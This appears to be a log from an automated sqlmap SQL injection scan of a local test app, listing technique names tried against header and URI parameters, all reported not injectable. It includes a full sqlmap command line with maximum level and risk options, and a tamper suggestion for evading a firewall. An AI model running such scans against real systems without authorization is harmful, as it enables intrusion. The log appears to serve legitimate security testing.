2025-09-26 18:56:40,305 - INFO - [18:56:40] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause (original value)'
2025-09-26 18:56:40,323 - INFO - [18:56:40] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause'
2025-09-26 18:56:40,343 - INFO - [18:56:40] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause (original value)'
2025-09-26 18:56:40,353 - INFO - [18:56:40] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
2025-09-26 18:56:40,691 - INFO - [18:56:40] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
2025-09-26 18:56:40,930 - INFO - [18:56:40] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'
2025-09-26 18:56:40,948 - INFO - [18:56:40] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
2025-09-26 18:56:41,174 - INFO - [18:56:41] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)'
2025-09-26 18:56:41,381 - INFO - [18:56:41] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries (IF)'
2025-09-26 18:56:41,648 - INFO - [18:56:41] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries'
2025-09-26 18:56:41,893 - INFO - [18:56:41] [INFO] testing 'Oracle boolean-based blind - Stacked queries'
2025-09-26 18:56:42,109 - INFO - [18:56:42] [INFO] testing 'Microsoft Access boolean-based blind - Stacked queries'
2025-09-26 18:56:42,333 - INFO - [18:56:42] [INFO] testing 'SAP MaxDB boolean-based blind - Stacked queries'
2025-09-26 18:56:42,559 - INFO - [18:56:42] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
2025-09-26 18:56:43,146 - INFO - [18:56:43] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
2025-09-26 18:56:43,683 - INFO - [18:56:43] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'
2025-09-26 18:56:44,186 - INFO - [18:56:44] [INFO] testing 'MySQL UNION query (random number) - 1 to 10 columns'
2025-09-26 18:56:44,686 - INFO - [18:56:44] [WARNING] parameter 'User-Agent' does not seem to be injectable
2025-09-26 18:56:44,686 - INFO - [18:56:44] [INFO] testing if parameter 'Referer' is dynamic
2025-09-26 18:56:44,696 - INFO - [18:56:44] [WARNING] parameter 'Referer' does not appear to be dynamic
2025-09-26 18:56:44,707 - INFO - [18:56:44] [WARNING] heuristic (basic) test shows that parameter 'Referer' might not be injectable
2025-09-26 18:56:44,720 - INFO - [18:56:44] [INFO] testing for SQL injection on parameter 'Referer'
2025-09-26 18:56:44,782 - INFO - [18:56:44] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
2025-09-26 18:56:45,239 - INFO - [18:56:45] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
2025-09-26 18:56:45,863 - INFO - [18:56:45] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
2025-09-26 18:56:46,255 - INFO - [18:56:46] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
2025-09-26 18:56:46,603 - INFO - [18:56:46] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
2025-09-26 18:56:46,964 - INFO - [18:56:46] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
2025-09-26 18:56:47,058 - INFO - [18:56:47] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
2025-09-26 18:56:47,187 - INFO - [18:56:47] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
2025-09-26 18:56:47,273 - INFO - [18:56:47] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
2025-09-26 18:56:47,459 - INFO - [18:56:47] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
2025-09-26 18:56:47,767 - INFO - [18:56:47] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
2025-09-26 18:56:47,949 - INFO - [18:56:47] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
2025-09-26 18:56:48,151 - INFO - [18:56:48] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
2025-09-26 18:56:48,418 - INFO - [18:56:48] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
2025-09-26 18:56:48,711 - INFO - [18:56:48] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
2025-09-26 18:56:49,037 - INFO - [18:56:49] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
2025-09-26 18:56:49,519 - INFO - [18:56:49] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
2025-09-26 18:56:49,885 - INFO - [18:56:49] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
2025-09-26 18:56:50,365 - INFO - [18:56:50] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
2025-09-26 18:56:50,657 - INFO - [18:56:50] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
2025-09-26 18:56:51,206 - INFO - [18:56:51] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
2025-09-26 18:56:51,510 - INFO - [18:56:51] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
2025-09-26 18:56:52,057 - INFO - [18:56:52] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
2025-09-26 18:56:52,355 - INFO - [18:56:52] [INFO] testing 'Oracle OR boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
2025-09-26 18:56:52,901 - INFO - [18:56:52] [INFO] testing 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
2025-09-26 18:56:53,224 - INFO - [18:56:53] [INFO] testing 'SQLite OR boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
2025-09-26 18:56:53,870 - INFO - [18:56:53] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
2025-09-26 18:56:53,880 - INFO - [18:56:53] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
2025-09-26 18:56:53,880 - INFO - [18:56:53] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
2025-09-26 18:56:53,899 - INFO - [18:56:53] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
2025-09-26 18:56:53,910 - INFO - [18:56:53] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
2025-09-26 18:56:53,927 - INFO - [18:56:53] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
2025-09-26 18:56:53,935 - INFO - [18:56:53] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
2025-09-26 18:56:53,940 - INFO - [18:56:53] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
2025-09-26 18:56:53,952 - INFO - [18:56:53] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
2025-09-26 18:56:53,973 - INFO - [18:56:53] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
2025-09-26 18:56:53,990 - INFO - [18:56:53] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
2025-09-26 18:56:53,998 - INFO - [18:56:53] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace'
2025-09-26 18:56:53,998 - INFO - [18:56:53] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)'
2025-09-26 18:56:54,024 - INFO - [18:56:54] [INFO] testing 'Oracle boolean-based blind - Parameter replace'
2025-09-26 18:56:54,031 - INFO - [18:56:54] [INFO] testing 'Oracle boolean-based blind - Parameter replace (original value)'
2025-09-26 18:56:54,046 - INFO - [18:56:54] [INFO] testing 'Informix boolean-based blind - Parameter replace'
2025-09-26 18:56:54,056 - INFO - [18:56:54] [INFO] testing 'Informix boolean-based blind - Parameter replace (original value)'
2025-09-26 18:56:54,072 - INFO - [18:56:54] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace'
2025-09-26 18:56:54,092 - INFO - [18:56:54] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace (original value)'
2025-09-26 18:56:54,102 - INFO - [18:56:54] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
2025-09-26 18:56:54,119 - INFO - [18:56:54] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
2025-09-26 18:56:54,122 - INFO - [18:56:54] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
2025-09-26 18:56:54,148 - INFO - [18:56:54] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
2025-09-26 18:56:54,158 - INFO - [18:56:54] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:56:54,186 - INFO - [18:56:54] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
2025-09-26 18:56:54,207 - INFO - [18:56:54] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:56:54,207 - INFO - [18:56:54] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
2025-09-26 18:56:54,220 - INFO - [18:56:54] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:56:54,245 - INFO - [18:56:54] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
2025-09-26 18:56:54,273 - INFO - [18:56:54] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)'
2025-09-26 18:56:54,300 - INFO - [18:56:54] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause'
2025-09-26 18:56:54,328 - INFO - [18:56:54] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause (original value)'
2025-09-26 18:56:54,355 - INFO - [18:56:54] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:56:54,378 - INFO - [18:56:54] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause (original value)'
2025-09-26 18:56:54,395 - INFO - [18:56:54] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:56:54,420 - INFO - [18:56:54] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause (original value)'
2025-09-26 18:56:54,441 - INFO - [18:56:54] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:56:54,465 - INFO - [18:56:54] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause (original value)'
2025-09-26 18:56:54,492 - INFO - [18:56:54] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause'
2025-09-26 18:56:54,498 - INFO - [18:56:54] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause (original value)'
2025-09-26 18:56:54,528 - INFO - [18:56:54] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
2025-09-26 18:56:54,806 - INFO - [18:56:54] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
2025-09-26 18:56:55,020 - INFO - [18:56:55] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'
2025-09-26 18:56:55,031 - INFO - [18:56:55] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
2025-09-26 18:56:55,230 - INFO - [18:56:55] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)'
2025-09-26 18:56:55,455 - INFO - [18:56:55] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries (IF)'
2025-09-26 18:56:55,675 - INFO - [18:56:55] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries'
2025-09-26 18:56:55,897 - INFO - [18:56:55] [INFO] testing 'Oracle boolean-based blind - Stacked queries'
2025-09-26 18:56:56,100 - INFO - [18:56:56] [INFO] testing 'Microsoft Access boolean-based blind - Stacked queries'
2025-09-26 18:56:56,331 - INFO - [18:56:56] [INFO] testing 'SAP MaxDB boolean-based blind - Stacked queries'
2025-09-26 18:56:56,608 - INFO - [18:56:56] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
2025-09-26 18:56:57,138 - INFO - [18:56:57] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
2025-09-26 18:56:57,646 - INFO - [18:56:57] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'
2025-09-26 18:56:58,176 - INFO - [18:56:58] [INFO] testing 'MySQL UNION query (random number) - 1 to 10 columns'
2025-09-26 18:56:58,731 - INFO - [18:56:58] [WARNING] parameter 'Referer' does not seem to be injectable
2025-09-26 18:56:58,731 - INFO - [18:56:58] [INFO] testing if parameter 'Host' is dynamic
2025-09-26 18:56:58,748 - INFO - [18:56:58] [WARNING] parameter 'Host' does not appear to be dynamic
2025-09-26 18:56:58,755 - INFO - [18:56:58] [WARNING] heuristic (basic) test shows that parameter 'Host' might not be injectable
2025-09-26 18:56:58,771 - INFO - [18:56:58] [INFO] testing for SQL injection on parameter 'Host'
2025-09-26 18:56:58,850 - INFO - [18:56:58] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
2025-09-26 18:56:59,267 - INFO - [18:56:59] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
2025-09-26 18:56:59,914 - INFO - [18:56:59] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
2025-09-26 18:57:00,321 - INFO - [18:57:00] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
2025-09-26 18:57:00,626 - INFO - [18:57:00] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
2025-09-26 18:57:01,021 - INFO - [18:57:01] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
2025-09-26 18:57:01,112 - INFO - [18:57:01] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
2025-09-26 18:57:01,253 - INFO - [18:57:01] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
2025-09-26 18:57:01,344 - INFO - [18:57:01] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
2025-09-26 18:57:01,511 - INFO - [18:57:01] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
2025-09-26 18:57:01,773 - INFO - [18:57:01] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
2025-09-26 18:57:01,943 - INFO - [18:57:01] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
2025-09-26 18:57:02,109 - INFO - [18:57:02] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
2025-09-26 18:57:02,381 - INFO - [18:57:02] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
2025-09-26 18:57:02,708 - INFO - [18:57:02] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
2025-09-26 18:57:03,022 - INFO - [18:57:03] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
2025-09-26 18:57:03,677 - INFO - [18:57:03] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
2025-09-26 18:57:04,033 - INFO - [18:57:04] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
2025-09-26 18:57:04,653 - INFO - [18:57:04] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
2025-09-26 18:57:05,030 - INFO - [18:57:05] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
2025-09-26 18:57:05,654 - INFO - [18:57:05] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
2025-09-26 18:57:06,056 - INFO - [18:57:06] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
2025-09-26 18:57:06,528 - INFO - [18:57:06] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
2025-09-26 18:57:06,800 - INFO - [18:57:06] [INFO] testing 'Oracle OR boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
2025-09-26 18:57:07,262 - INFO - [18:57:07] [INFO] testing 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
2025-09-26 18:57:07,574 - INFO - [18:57:07] [INFO] testing 'SQLite OR boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
2025-09-26 18:57:08,123 - INFO - [18:57:08] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
2025-09-26 18:57:08,130 - INFO - [18:57:08] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
2025-09-26 18:57:08,141 - INFO - [18:57:08] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
2025-09-26 18:57:08,152 - INFO - [18:57:08] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
2025-09-26 18:57:08,166 - INFO - [18:57:08] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
2025-09-26 18:57:08,176 - INFO - [18:57:08] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
2025-09-26 18:57:08,176 - INFO - [18:57:08] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
2025-09-26 18:57:08,199 - INFO - [18:57:08] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
2025-09-26 18:57:08,214 - INFO - [18:57:08] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
2025-09-26 18:57:08,219 - INFO - [18:57:08] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
2025-09-26 18:57:08,232 - INFO - [18:57:08] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
2025-09-26 18:57:08,242 - INFO - [18:57:08] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace'
2025-09-26 18:57:08,242 - INFO - [18:57:08] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)'
2025-09-26 18:57:08,265 - INFO - [18:57:08] [INFO] testing 'Oracle boolean-based blind - Parameter replace'
2025-09-26 18:57:08,275 - INFO - [18:57:08] [INFO] testing 'Oracle boolean-based blind - Parameter replace (original value)'
2025-09-26 18:57:08,275 - INFO - [18:57:08] [INFO] testing 'Informix boolean-based blind - Parameter replace'
2025-09-26 18:57:08,292 - INFO - [18:57:08] [INFO] testing 'Informix boolean-based blind - Parameter replace (original value)'
2025-09-26 18:57:08,292 - INFO - [18:57:08] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace'
2025-09-26 18:57:08,315 - INFO - [18:57:08] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace (original value)'
2025-09-26 18:57:08,325 - INFO - [18:57:08] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
2025-09-26 18:57:08,325 - INFO - [18:57:08] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
2025-09-26 18:57:08,352 - INFO - [18:57:08] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
2025-09-26 18:57:08,357 - INFO - [18:57:08] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
2025-09-26 18:57:08,367 - INFO - [18:57:08] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:57:08,383 - INFO - [18:57:08] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
2025-09-26 18:57:08,393 - INFO - [18:57:08] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:57:08,409 - INFO - [18:57:08] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
2025-09-26 18:57:08,409 - INFO - [18:57:08] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:57:08,439 - INFO - [18:57:08] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
2025-09-26 18:57:08,463 - INFO - [18:57:08] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)'
2025-09-26 18:57:08,483 - INFO - [18:57:08] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause'
2025-09-26 18:57:08,503 - INFO - [18:57:08] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause (original value)'
2025-09-26 18:57:08,524 - INFO - [18:57:08] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:57:08,546 - INFO - [18:57:08] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause (original value)'
2025-09-26 18:57:08,562 - INFO - [18:57:08] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:57:08,581 - INFO - [18:57:08] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause (original value)'
2025-09-26 18:57:08,591 - INFO - [18:57:08] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:57:08,609 - INFO - [18:57:08] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause (original value)'
2025-09-26 18:57:08,641 - INFO - [18:57:08] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause'
2025-09-26 18:57:08,655 - INFO - [18:57:08] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause (original value)'
2025-09-26 18:57:08,680 - INFO - [18:57:08] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
2025-09-26 18:57:08,946 - INFO - [18:57:08] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
2025-09-26 18:57:09,144 - INFO - [18:57:09] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'
2025-09-26 18:57:09,144 - INFO - [18:57:09] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
2025-09-26 18:57:09,354 - INFO - [18:57:09] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)'
2025-09-26 18:57:09,563 - INFO - [18:57:09] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries (IF)'
2025-09-26 18:57:09,770 - INFO - [18:57:09] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries'
2025-09-26 18:57:10,021 - INFO - [18:57:10] [INFO] testing 'Oracle boolean-based blind - Stacked queries'
2025-09-26 18:57:10,247 - INFO - [18:57:10] [INFO] testing 'Microsoft Access boolean-based blind - Stacked queries'
2025-09-26 18:57:10,456 - INFO - [18:57:10] [INFO] testing 'SAP MaxDB boolean-based blind - Stacked queries'
2025-09-26 18:57:10,683 - INFO - [18:57:10] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
2025-09-26 18:57:11,196 - INFO - [18:57:11] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
2025-09-26 18:57:11,758 - INFO - [18:57:11] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'
2025-09-26 18:57:12,365 - INFO - [18:57:12] [INFO] testing 'MySQL UNION query (random number) - 1 to 10 columns'
2025-09-26 18:57:12,923 - INFO - [18:57:12] [WARNING] parameter 'Host' does not seem to be injectable
2025-09-26 18:57:12,923 - INFO - [18:57:12] [CRITICAL] all tested parameters do not appear to be injectable. Rerun without providing the option '--technique'. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
2025-09-26 18:57:12,923 - INFO - [18:57:12] [WARNING] HTTP error codes detected during run:
2025-09-26 18:57:12,923 - INFO - 405 (Method Not Allowed) - 5160 times, 404 (Not Found) - 2360 times
2025-09-26 18:57:12,923 - INFO - 
2025-09-26 18:57:12,923 - INFO - [*] ending @ 18:57:12 /2025-09-26/
2025-09-26 18:57:12,923 - INFO - 

-------------------- EXECUTING COMMAND --------------------
'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' -u http://localhost:5000/pickle --output-dir 'attack-logs-dynamic\Insecure_Deserialization_sqlmap' --batch --level=5 --risk=3 --threads 5 --technique BU
--------------------------------------------------
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.9.9.4#dev}
|_ -| . [,]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:56:06 /2025-09-26/

[18:56:08] [WARNING] using 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\Insecure_Deserialization_sqlmap' as the output directory
[18:56:08] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
do you want to try URI injections in the target URL itself? [Y/n/q] Y
[18:56:08] [INFO] testing connection to the target URL
[18:56:08] [WARNING] the web server responded with an HTTP error code (405) which could interfere with the results of the tests
[18:56:08] [INFO] checking if the target is protected by some kind of WAF/IPS
[18:56:09] [INFO] testing if the target URL content is stable
[18:56:09] [INFO] target URL content is stable
[18:56:09] [INFO] testing if URI parameter '#1*' is dynamic
[18:56:09] [INFO] URI parameter '#1*' appears to be dynamic
[18:56:09] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
[18:56:09] [INFO] testing for SQL injection on URI parameter '#1*'
[18:56:09] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[18:56:10] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[18:56:11] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[18:56:12] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[18:56:12] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[18:56:13] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[18:56:13] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[18:56:13] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[18:56:13] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[18:56:14] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[18:56:14] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[18:56:14] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
[18:56:15] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
[18:56:15] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[18:56:16] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[18:56:16] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[18:56:17] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[18:56:18] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[18:56:18] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[18:56:19] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[18:56:19] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
[18:56:20] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
[18:56:21] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
[18:56:21] [INFO] testing 'Oracle OR boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
[18:56:22] [INFO] testing 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
